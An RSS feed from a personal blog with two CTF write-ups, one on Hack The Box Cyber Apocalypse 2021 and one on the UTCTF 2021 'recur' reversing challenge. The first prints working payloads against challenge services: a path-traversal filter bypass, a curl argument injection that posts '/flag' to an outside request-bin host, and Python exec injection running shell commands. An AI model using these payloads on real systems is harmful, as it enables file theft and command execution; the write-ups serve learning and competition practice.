<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Saurabh Mittal</title>
        <link>https://saurabhmittal16.github.io/posts/</link>
        <description>Recent content in Posts on Saurabh Mittal</description>
        <generator>Hugo -- gohugo.io</generator>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Sun, 25 Apr 2021 22:00:35 +0530</lastBuildDate>
        <atom:link href="https://saurabhmittal16.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Hack The Box - Cyber Apocalypse CTF 21</title>
            <link>https://saurabhmittal16.github.io/posts/2021/04/hack-the-box-cyber-apocalypse-ctf-21/</link>
            <pubDate>Sun, 25 Apr 2021 22:00:35 +0530</pubDate>
            
            <guid>https://saurabhmittal16.github.io/posts/2021/04/hack-the-box-cyber-apocalypse-ctf-21/</guid>
            <description>I participated in Hack The Box&amp;rsquo;s Cyber Apocalypse CTF 2021 this week. I was only able to solve 11 challenges (excluding the welcome challenge) but overall it was a fun event. The challenges were nice and did not need any form of guessing.
WEB - Inspector Gadget This was the entry level web challenge and the flag was split in 3 parts which were then placed in the HTML, CSS and JavaScript files as comments.</description>
            <content type="html"><![CDATA[<p>I participated in Hack The Box&rsquo;s Cyber Apocalypse CTF 2021 this week. I was only able to solve 11 challenges (excluding the welcome challenge) but overall it was a fun event. The challenges were nice and did not need any form of guessing.</p>
<h2 id="web---inspector-gadget">WEB - Inspector Gadget</h2>
<p>This was the entry level web challenge and the flag was split in 3 parts which were then placed in the HTML, CSS and JavaScript files as comments.</p>
<h2 id="web---ministryplace">WEB - MiniSTRyplace</h2>
<p>This challenge provided the source code of the challenge. The website was running a PHP script which checked the <code>lang</code> URL parameter and included that language&rsquo;s PHP page. It was pretty clear that this was a <a href="https://owasp.org/www-community/attacks/Path_Traversal">Path Traversal Exploit</a> but the solution wasn&rsquo;t straightforward.</p>
<p>Here is the code snippet that performed the file inclusion. The code has a very weak &ldquo;filter&rdquo; to prevent path traversal attack.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
$lang <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;en.php&#39;</span>, <span style="color:#e6db74">&#39;qw.php&#39;</span>];
    <span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#39;pages/&#39;</span> <span style="color:#f92672">.</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;lang&#39;</span>]) <span style="color:#f92672">?</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39;../&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, $_GET[<span style="color:#e6db74">&#39;lang&#39;</span>]) <span style="color:#f92672">:</span> $lang[<span style="color:#a6e22e">array_rand</span>($lang)]));
<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">&lt;/body&gt;
</span></code></pre></div><p>Honestly, I had no idea how to bypass this <code>str_replace</code> filter and this is perhaps the simplest filter to stop path traversal. The <code>str_replace</code> function call removes <code>../</code> from the provided string. So, I started reading about path traversal attacks and the solution I found was so obvious that I wanted to punch myself.</p>
<p>What <code>str_replace</code> is doing is that it removes all instances of <code>../</code> in the given string but it does not do this recursively. A string like <code>../../../../foo/bar</code> will get reduced to <code>foo/bar</code> but <code>...././foo/bar</code> will get reduced to <code>../foo/bar</code>. Therefore, all you need to do is add <code>../</code> in the payload which when removed will give the required payload.</p>
<p>Final payload: <code>?lang=..././..././flag</code></p>
<h2 id="web---caas">WEB - Caas</h2>
<p>This challenge also provided the source code of the website but the codebase was larger than the previous problems. Long story short, the website took a URL as input and a <code>CURL</code> request was made to the URL from the PHP backend and the output was then returned to the client. This is the PHP code snippet that made the <code>CURL</code> request -</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CommandModel</span>
{
    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($url)
    {
        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">command</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;curl -sL &#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">escapeshellcmd</span>($url);
    }

    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">exec</span>()
    {
        <span style="color:#a6e22e">exec</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">command</span>, $output);
        <span style="color:#66d9ef">return</span> $output;
    }
}
</code></pre></div><p>So, like the noobie that I am, I tried different payloads without understanding the code properly. I tried appending simple bash commands like - <code>ls</code>, <code>cat flag.txt</code> to the <code>url</code> parameter hoping that this injected command would get executed after <code>curl</code>. Turns out, this is what <code>escapeshellcmd</code> is supposed to filter. From the PHP docs -</p>
<blockquote>
<p>escapeshellcmd() escapes any characters in a string that might be used to trick a shell command into executing arbitrary commands.</p>
</blockquote>
<p>So, I started reading about <code>escapeshellcmd</code> exploits and found a Github <a href="https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md">repo</a> that had payloads for <code>escapeshellcmd</code> exploits. Basically, the idea is to make a <code>POST</code> request using the <code>CURL</code> command and send the <code>flag.txt</code> file along with the request. I found <a href="https://stackoverflow.com/questions/12667797/using-curl-to-upload-post-data-with-files">this</a> answer that showed how to do this.</p>
<p>Now, all I needed was an endpoint to make a <code>POST</code> request to and view the received request. These are called Request Bins and are used a lot in XSS challenges. For this challenge, I used Beeceptor.</p>
<p>Final payload: <code>-F file=@/flag https://ctfctf.free.beeceptor.com</code></p>
<p>Here is the request I received on Beeceptor&rsquo;s console. Also, the flag visible in the request body is the test flag since I generated this request from a local instance for the writeup.</p>
<p><img src="/static/beeceptor.png" alt="console"></p>
<p>I read other people&rsquo;s writeups once the event was over and the actual solution made me feel very dumb. You can simply use the <code>file</code> URI <a href="https://en.wikipedia.org/wiki/File_URI_scheme">scheme</a> to directly read the <code>flag</code> file. A <code>GET</code> request to <code>file:///flag</code> would just return the file directly.</p>
<h2 id="misc---input-as-a-service">MISC - Input as a Service</h2>
<p>This challenge only provided an IP address to connect to and nothing else. After connecting to the IP using netcat, you get an interactive shell. After playing around with it for a few minutes, you would realise that it is a python shell. Basically, the input was executed as python using the <code>exec</code> command. Here is a code snippet that might have been running at the server -</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">while</span> <span style="color:#ae81ff">1</span>:
  text <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#39;&gt;&gt; &#39;</span>)
  <span style="color:#66d9ef">exec</span>(text)
</code></pre></div><p>I tried running <code>ls</code> command using <code>os.system(&quot;ls&quot;)</code> but the module <code>os</code> was not imported in the running environment. So, I started my research and found an <a href="http://vipulchaskar.blogspot.com/2012/10/exploiting-eval-function-in-python">article</a>.</p>
<p>The solution is that python has a function <code>__import__</code> that can be used to dynamically include modules and run commands. Here are the commands I tried and the output I received.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">Do you sound like an alien<span style="color:#960050;background-color:#1e0010">?</span>
<span style="color:#f92672">&gt;&gt;&gt;</span> 
__import__(<span style="color:#e6db74">&#34;os&#34;</span>)<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;ls&#34;</span>)
flag<span style="color:#f92672">.</span>txt
input_as_a_service<span style="color:#f92672">.</span>py
__import__(<span style="color:#e6db74">&#34;os&#34;</span>)<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;cat flag.txt&#34;</span>)
CHTB{<span style="color:#ae81ff">4</span>li3n5_us3_pyth0n2<span style="color:#f92672">.</span>X<span style="color:#960050;background-color:#1e0010">?!</span>}
</code></pre></div><h2 id="misc---alien-camp">MISC - Alien Camp</h2>
<p>In this challenge, there was a mapping provided to us which was an emoji and an integer associated with it. In order to get the flag, 500 queries had to be answered that were mathematical expressions using the emojis. Obviously this can not be done manually and needed automation.</p>
<p>The solution to this was pretty straightforward. I created a simple dictionary with the emojis as key and the integer as the value. And for every query, I replaced the emoji with its integer value and evaluated the string using <code>eval</code>. Here is the final script that worked.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;138.68.185.219&#34;</span>, <span style="color:#ae81ff">31618</span>)
r<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode()

r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)

r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;help:</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>decode()
keys <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>decode()

keys <span style="color:#f92672">=</span> keys<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34; &#34;</span>)
nums <span style="color:#f92672">=</span> dict()

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(keys), <span style="color:#ae81ff">3</span>):
    nums[keys[i]] <span style="color:#f92672">=</span> keys[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>]

<span style="color:#66d9ef">print</span>(nums)

r<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode()
r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">500</span>):
    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>decode()
    query <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34; =&#34;</span>)<span style="color:#f92672">.</span>decode()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>]

    <span style="color:#66d9ef">for</span> each <span style="color:#f92672">in</span> nums<span style="color:#f92672">.</span>keys():
        query <span style="color:#f92672">=</span> query<span style="color:#f92672">.</span>replace(each, nums[each])
    ans <span style="color:#f92672">=</span> str(eval(query))

    r<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode()
    r<span style="color:#f92672">.</span>sendline(str(ans))

<span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode())
</code></pre></div><h2 id="rev---passphrase">REV - Passphrase</h2>
<p>This was a reverse engineering challenge so naturally there was a binary provided. The binary was a <code>64-bit ELF</code> that wasn&rsquo;t stripped. On running the binary, it asked for a secret passphrase and it was safe to assume that the flag was the secret passphrase.</p>
<p>On executing the binary instruction by instruction, I found that there was a call to <code>strcmp</code> function that compared the user input to a fixed value. When the execution reached the <code>strcmp</code> call, the two values were present in the appropriate registers. Here is the gdb output on reaching the <code>strcmp</code> call.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> ► 0x555555554ac0 &lt;main+250&gt;    call   strcmp@plt &lt;0x555555554820&gt;
        s1: 0x7fffffffdda0 ◂— <span style="color:#e6db74">&#39;3xtr4t3rR3stR14L5_VS_hum4n5&#39;</span>
        s2: 0x7fffffffddc0 ◂— 0x41414141 /* <span style="color:#e6db74">&#39;AAAA&#39;</span> */
 
</code></pre></div><p>Thanks <a href="https://github.com/pwndbg/pwndbg">pwndbg</a> for making our lives easier.</p>
<h2 id="rev---authenticator">REV - Authenticator</h2>
<p>This was another easy straightforward challenge. The binary asked for an Alien ID which was <code>11337</code>. This was present in the source code of the binary generated by Ghidra. The second input asked for a pin which was checked by the <code>checkpin</code> function. Here is the source code of the function.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">undefined8 <span style="color:#a6e22e">checkpin</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>param_1) {
  size_t sVar1;
  <span style="color:#66d9ef">int</span> local_24;
  
  local_24 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
  <span style="color:#66d9ef">while</span>( true ) {
    sVar1 <span style="color:#f92672">=</span> strlen(param_1);
    <span style="color:#66d9ef">if</span> (sVar1 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;=</span> (ulong)(<span style="color:#66d9ef">long</span>)local_24) {
      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
    }
    <span style="color:#66d9ef">if</span> ((byte)(<span style="color:#e6db74">&#34;}a:Vh|}a:g}8j=}89gV&lt;p&lt;}:dV8&lt;Vg9}V&lt;9V&lt;:j|{:&#34;</span>[local_24] <span style="color:#f92672">^</span> <span style="color:#ae81ff">9U</span>) <span style="color:#f92672">!=</span> param_1[local_24])
    <span style="color:#66d9ef">break</span>;
    local_24 <span style="color:#f92672">=</span> local_24 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
  }
  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
}
</code></pre></div><p>This function computes the XOR of this string with the integer <code>9</code> and compares with the provided input. Therefore, the flag is this long string when XOR&rsquo;d with <code>9</code> byte by byte. Pretty straightforward like I said before.</p>
<h2 id="conclusion">Conclusion</h2>
<p>Overall, I enjoyed working on these challenges and the writeups I have read on the challenges I couldn&rsquo;t solve have been amazing. I was so close in some of them but just couldn&rsquo;t connect the final dot. Other than these, I also solved 4 crypto challenges but I am not at all equipped with the skills to explain how I solved them. I like that the difficulty level of problems increased gradually so everyone could solve some challenges. I finished at 652 in 4740 teams which isn&rsquo;t that good but I learned a great deal from this CTF. This was clearly the best CTF I have participated in and the team at Hack The Box did a great job. Thanks for reading. Cheers!</p>
]]></content>
        </item>
        
        <item>
            <title>UTCTF recur challenge</title>
            <link>https://saurabhmittal16.github.io/posts/2021/03/utctf-recur-challenge/</link>
            <pubDate>Mon, 15 Mar 2021 22:00:35 +0530</pubDate>
            
            <guid>https://saurabhmittal16.github.io/posts/2021/03/utctf-recur-challenge/</guid>
            <description>Over the weekend, I participated in the UTCTF 2021 but was unable to spend a lot of time on the challenges. One of the challenge I worked on was the recur challenge in the Reverse Engineering category. The challenge was not that hard but I had fun working on it so I decided to write a writeup for the challenge.
The challenge had a binary file attached with it and the description of the challenge was</description>
            <content type="html"><![CDATA[<p>Over the weekend, I participated in the <a href="https://utctf.live/">UTCTF 2021</a> but was unable to spend a lot of time on the challenges. One of the challenge I worked on was the <strong>recur</strong> challenge in the Reverse Engineering category. The challenge was not that hard but I had fun working on it so I decided to write a writeup for the challenge.</p>
<p>The challenge had a binary file attached with it and the description of the challenge was</p>
<blockquote>
<p>I found this binary that is supposed to print flags. It doesn&rsquo;t seem to work properly though&hellip;</p>
</blockquote>
<p>I usually run the <code>file</code> command on the challenge binaries just to know if they are stripped or not. A stripped binary has no debugging symbols which makes it harder to debug and reverse. <a href="https://medium.com/@tr0id/working-with-stripped-binaries-in-gdb-cacacd7d5a33">Here</a> is an article that compare the two and explains how to deal with a stripped binary.</p>
<p>Back to the challenge, here is the output of the <code>file</code> command on our binary -</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ file ./recur
recur: ELF 64-bit LSB shared object, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>ffe1273695471373b182d4f5f266181d893ba3d8, <span style="color:#66d9ef">for</span> GNU/Linux 4.4.0, not stripped
</code></pre></div><p>Not stripped which means it would be easy to debug. I also execute the binary just to get an idea of the output. Like the description said, the binary prints the flag but is stuck after <code>{</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./recur
utflag<span style="color:#f92672">{</span>
</code></pre></div><p>For the reversing challenges, I use <a href="https://ghidra-sre.org/">Ghidra</a> which is a well known reverse engineering tool and is used for generating C source code from an executable. The decompiled binary had the <code>main</code> function and a function called <code>recurrence</code>. Here are the source codes of the two functions</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>) {
  byte bVar1;
  byte bVar2;
  <span style="color:#66d9ef">int</span> local_1c;
  
  local_1c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
  <span style="color:#66d9ef">while</span> (local_1c <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x1c</span>) {
    bVar1 <span style="color:#f92672">=</span> flag[local_1c];
    bVar2 <span style="color:#f92672">=</span> recurrence();
    putchar((<span style="color:#66d9ef">int</span>)(<span style="color:#66d9ef">char</span>)(bVar2 <span style="color:#f92672">^</span> bVar1));
    fflush(stdout);
    local_1c <span style="color:#f92672">=</span> local_1c <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
  }
  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">ulong <span style="color:#a6e22e">recurrence</span>(<span style="color:#66d9ef">int</span> param_1) {
  <span style="color:#66d9ef">int</span> iVar1;
  <span style="color:#66d9ef">int</span> iVar2;
  ulong uVar3;
  
  <span style="color:#66d9ef">if</span> (param_1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
    uVar3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>;
  }
  <span style="color:#66d9ef">else</span> {
    <span style="color:#66d9ef">if</span> (param_1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
      uVar3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>;
    }
    <span style="color:#66d9ef">else</span> {
      iVar1 <span style="color:#f92672">=</span> recurrence((ulong)(param_1 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>));
      iVar2 <span style="color:#f92672">=</span> recurrence((ulong)(param_1 <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span>));
      uVar3 <span style="color:#f92672">=</span> (ulong)(uint)(iVar2 <span style="color:#f92672">*</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> iVar1 <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>);
    }
  }
  <span style="color:#66d9ef">return</span> uVar3;
}
</code></pre></div><p>The code is pretty readable and instead of going through it line by line, here are some things which we learn from the code.</p>
<ul>
<li>
<p>The <code>recurrence</code> function defines a recurrence relation that can be described as</p>
<pre><code class="language-math" data-lang="math">f(x) = 3 if x = 0
     = 5 if x = 1
     = 2 * f(x-1) + 3 * f(x-2)
</code></pre><p>This is similar to the Fibonacci sequence.</p>
</li>
<li>
<p>The <code>main</code> function reads <code>28</code> bytes as <code>flag</code> and a new character is evaluated using the <code>flag</code> byte and the output of the <code>recurrence</code> method.</p>
</li>
<li>
<p>The new character is calculated using the <code>XOR</code> operation.</p>
</li>
</ul>
<p>Since, the output of the <code>recurrence</code> function is used in calculating the output character, we need the input to the <code>recurrence</code> function. The decompiled code does not show what is provided as input to the function. Also, the <code>28</code> bytes needed for flag need to be located. For both these problems, I used <code>gdb</code> to go through the assembly of the binary.</p>
<p>Here is the assembly of the first few lines of the main function -</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwndbg&gt; disass main
Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> main:
   0x000000000000119c &lt;+0&gt;: push   rbp
   0x000000000000119d &lt;+1&gt;: mov    rbp,rsp
   0x00000000000011a0 &lt;+4&gt;: push   rbx
   0x00000000000011a1 &lt;+5&gt;: sub    rsp,0x18
   0x00000000000011a5 &lt;+9&gt;: mov    DWORD PTR <span style="color:#f92672">[</span>rbp-0x14<span style="color:#f92672">]</span>,0x0
   0x00000000000011ac &lt;+16&gt;: jmp    0x11ea &lt;main+78&gt;
   0x00000000000011ae &lt;+18&gt;: mov    eax,DWORD PTR <span style="color:#f92672">[</span>rbp-0x14<span style="color:#f92672">]</span>
   0x00000000000011b1 &lt;+21&gt;: cdqe   
   0x00000000000011b3 &lt;+23&gt;: lea    rdx,<span style="color:#f92672">[</span>rip+0x2e86<span style="color:#f92672">]</span>   <span style="color:#75715e"># 0x4040 &lt;flag&gt;</span>
</code></pre></div><p>As you can see, <code>gdb</code> has pointed out that the <code>flag</code> is stored at <code>0x4040</code> and all we need to do is read 28 bytes from this address.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwndbg&gt; x/28bx 0x4040
0x4040 &lt;flag&gt;:  0x76  0x71  0xc5  0xa9  0xe2  0x22  0xd8  0xb5
0x4048 &lt;flag+8&gt;:  0x73  0xf1  0x92  0x28  0xb2  0xbf  0x90  0x5a
0x4050 &lt;flag+16&gt;:  0x76  0x77  0xfc  0xa6  0xb3  0x21  0x90  0xda
0x4058 &lt;flag+24&gt;:  0x6f  0xb5  0xcf  0x38
</code></pre></div><p>Next, we need to check what argument is provided to the <code>recurrence</code> function. For this, I just executed the binary instruction wise and observed the argument to the method. Here are the disassembly of the <code>recurrence</code> during the 3rd, 4th and 5th iteration.</p>
<p><img src="/static/utctf-recur.jpg" alt="assembly"></p>
<p>It is clear that the method takes the square of the iteration number as input. This explains why the flag stops printing after the 7th character since <code>f(64)</code> is heavy to compute.</p>
<p>Here is a python script I wrote that covers everything we have discussed so far.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">recur</span>(n):
    <span style="color:#66d9ef">if</span> (n <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>):
        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">3</span>
    <span style="color:#66d9ef">elif</span> (n <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>):
        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">5</span>
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">return</span> (<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> (recur(n<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> (recur(n<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>)) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>


flag <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x76</span>, <span style="color:#ae81ff">0x71</span>, <span style="color:#ae81ff">0xc5</span>, <span style="color:#ae81ff">0xa9</span>, <span style="color:#ae81ff">0xe2</span>, <span style="color:#ae81ff">0x22</span>, <span style="color:#ae81ff">0xd8</span>, <span style="color:#ae81ff">0xb5</span>, <span style="color:#ae81ff">0x73</span>, <span style="color:#ae81ff">0xf1</span>, <span style="color:#ae81ff">0x92</span>, <span style="color:#ae81ff">0x28</span>, <span style="color:#ae81ff">0xb2</span>, <span style="color:#ae81ff">0xbf</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0x5a</span>, <span style="color:#ae81ff">0x76</span>, <span style="color:#ae81ff">0x77</span>, <span style="color:#ae81ff">0xfc</span>, <span style="color:#ae81ff">0xa6</span>, <span style="color:#ae81ff">0xb3</span>, <span style="color:#ae81ff">0x21</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0xda</span>, <span style="color:#ae81ff">0x6f</span>, <span style="color:#ae81ff">0xb5</span>, <span style="color:#ae81ff">0xcf</span>, <span style="color:#ae81ff">0x38</span>]

res <span style="color:#f92672">=</span> []
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(flag)):
    val <span style="color:#f92672">=</span> (flag[i] <span style="color:#f92672">^</span> recur(i <span style="color:#f92672">*</span> i)) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>
    res<span style="color:#f92672">.</span>append(val)
    <span style="color:#66d9ef">print</span>(chr(val))

<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(list(map(<span style="color:#66d9ef">lambda</span> x: chr(x), res))))
</code></pre></div><p>The script is pretty easy to understand and I used mod 256 since we know that the <code>char</code> in <code>C</code> is 1 byte which means that only values <code>0-255</code> are present.</p>
<p>If we run this script, we get the same result as the executable ie the binary is stuck after the 6th character. The solution to this involves the concept of <a href="https://en.wikipedia.org/wiki/Memoization">Memoization</a> which basically means that we remember already computed states and reuse their output instead of re-executing the function. We could use a <code>dict</code> object that saves <code>n</code> as key and the output as value. Python provides an interesting module - <a href="https://docs.python.org/3/library/functools.html">functools</a> which has the <code>lru_cache</code> method that saves up the output of the recent function calls. Here is the final script that works.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> functools

<span style="color:#a6e22e">@functools.lru_cache</span>()
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">recur</span>(n):
    <span style="color:#66d9ef">if</span> (n <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>):
        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">3</span>
    <span style="color:#66d9ef">elif</span> (n <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>):
        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">5</span>
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">return</span> (<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> (recur(n<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> (recur(n<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>)) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>


flag <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x76</span>, <span style="color:#ae81ff">0x71</span>, <span style="color:#ae81ff">0xc5</span>, <span style="color:#ae81ff">0xa9</span>, <span style="color:#ae81ff">0xe2</span>, <span style="color:#ae81ff">0x22</span>, <span style="color:#ae81ff">0xd8</span>, <span style="color:#ae81ff">0xb5</span>, <span style="color:#ae81ff">0x73</span>, <span style="color:#ae81ff">0xf1</span>, <span style="color:#ae81ff">0x92</span>, <span style="color:#ae81ff">0x28</span>, <span style="color:#ae81ff">0xb2</span>, <span style="color:#ae81ff">0xbf</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0x5a</span>, <span style="color:#ae81ff">0x76</span>, <span style="color:#ae81ff">0x77</span>, <span style="color:#ae81ff">0xfc</span>, <span style="color:#ae81ff">0xa6</span>, <span style="color:#ae81ff">0xb3</span>, <span style="color:#ae81ff">0x21</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0xda</span>, <span style="color:#ae81ff">0x6f</span>, <span style="color:#ae81ff">0xb5</span>, <span style="color:#ae81ff">0xcf</span>, <span style="color:#ae81ff">0x38</span>]

res <span style="color:#f92672">=</span> []
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(flag)):
    val <span style="color:#f92672">=</span> (flag[i] <span style="color:#f92672">^</span> recur(i <span style="color:#f92672">*</span> i)) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>
    res<span style="color:#f92672">.</span>append(val)

<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(list(map(<span style="color:#66d9ef">lambda</span> x: chr(x), res))))
